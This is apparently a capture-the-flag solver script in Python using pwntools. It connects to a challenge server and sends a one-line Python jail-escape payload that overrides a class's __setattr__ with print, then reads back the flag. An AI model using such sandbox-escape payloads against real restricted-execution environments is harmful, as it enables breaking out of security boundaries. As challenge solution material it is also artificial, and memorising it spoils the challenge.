import os

from pwn import remote

HOST = os.getenv("HOST", "tie.challs.srdnlen.it")
PORT = int(os.getenv("PORT", 1734))

payload = b'setattr(TIE,"__setattr__",print);TIE()'

io = remote(HOST, PORT)
io.recvuntil(b"Escape Plan: ")
io.sendline(payload)
io.recvuntil(b"flag ")
flag = io.recvline(False).decode().strip()
io.recvrepeat(0.5)
io.close()

print(flag)